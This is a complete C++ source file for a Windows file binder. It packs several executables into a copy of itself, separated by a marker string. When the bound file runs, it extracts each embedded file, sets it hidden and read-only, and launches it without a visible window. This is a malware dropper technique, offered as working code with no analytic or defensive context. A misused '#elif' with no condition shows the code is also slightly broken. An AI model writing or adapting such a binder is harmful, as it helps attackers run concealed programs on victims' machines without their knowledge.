#include <Windows.h>

#include <filesystem>
#include <fstream>
#include <vector>
#include <string>

#define ExecuteAndHide(exe, hide) \
if (hide) ::SetFileAttributes(exe, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY); \
::ShellExecute(nullptr, TEXT("open"), exe, nullptr, nullptr, !hide);

#define SEPARATOR "Fj*GS%cM_WD2Pb&7BdhcdmE.Z$*D[y2SMYSYmBi:f+wYJjaZVgSYG!vb.c![F4ArC+:P?"
#define SEPARATOR_SIZE (sizeof(SEPARATOR) - 1)

void FindAllOccurrences(::std::vector<::size_t>& occurancesPoss, const ::std::string& data, const ::std::string& query) {
	::size_t pos = data.find(query);
	while (pos != ::std::string::npos) {
		occurancesPoss.push_back(pos);
		pos = data.find(query, pos + query.size());
	}
}

inline void FileAsString(::std::string& content, const ::std::string& file) {
	::std::ifstream ifs(file, ::std::ios::binary);
	content.assign((::std::istreambuf_iterator<char>(ifs)), ::std::istreambuf_iterator<char>());
}

inline ::std::string GetFileFromPath(const ::std::string& Path) {
	const auto posBackslash = Path.rfind('\\');
	return posBackslash == ::std::string::npos ? Path : Path.substr(posBackslash + 1);
}

void Bind(const ::std::vector<::std::string>& files, const ::std::string& fileBinded, const ::std::string& fileOpener) {
	::std::ofstream ofs(fileBinded, ::std::ios::binary);

	ofs << ::std::ifstream(fileOpener, ::std::ios::binary).rdbuf();
	for (const auto& file : files) {
		ofs << SEPARATOR << GetFileFromPath(file) << SEPARATOR << ::std::ifstream(file, ::std::ios::binary).rdbuf();
	}
}

inline ::std::wstring StringToWString(const ::std::string& str) {
	return ::std::wstring(str.begin(), str.end());
}

void FindFileNameCopy(::std::string& file) {
	size_t copyCount = 1;
	while (::std::filesystem::exists(file)) {
		const ::std::string replaceCurrent(" (" + ::std::to_string(copyCount) + ')');
		const ::std::string replaceLast(" (" + ::std::to_string(copyCount - 1) + ')');

		auto replacePos = file.rfind(replaceLast);
		auto replaceCount = replaceLast.length();
		if (copyCount++ == 1) {
			replacePos = file.rfind('.');
			replaceCount = 0;
		}

		file.replace(replacePos, replaceCount, replaceCurrent);
	}
}

void Open(const ::std::string& file, const bool hide = true) {
	::std::string content;
	FileAsString(content, file);

	::std::vector<::size_t> occurancesPoss;
	FindAllOccurrences(occurancesPoss, content, SEPARATOR);

	for (::size_t i = 1; i < occurancesPoss.size(); i += 2) {
		const auto fileToCreateStart = occurancesPoss[i] + SEPARATOR_SIZE;
		const auto fileToCreateSize = occurancesPoss[i + 1] - fileToCreateStart;
		::std::string fileToCreate(content.substr(fileToCreateStart, fileToCreateSize));

		const auto fileStart = occurancesPoss[i + 1] + SEPARATOR_SIZE;
		const auto fileSize = (i == occurancesPoss.size() - 2) ? ::std::string::npos : occurancesPoss[i + 2] - fileStart;

		FindFileNameCopy(fileToCreate);

		::std::ofstream(fileToCreate, ::std::ios::binary) << content.substr(fileStart, fileSize);

#ifdef UNICODE
		ExecuteAndHide(StringToWString(fileToCreate).c_str(), hide);
#elif
		ExecuteAndHide(fileToCreate.c_str(), hide);
#endif // UNICODE
	}
}

::int32_t main(::int32_t argc, char** argv) {
	if (argc > 1) {
		Bind(::std::vector<::std::string>(&argv[1], argv + argc - 1), argv[argc - 1], argv[0]);
	} else {
		Open(argv[0], true);
	}

	return EXIT_SUCCESS;
}
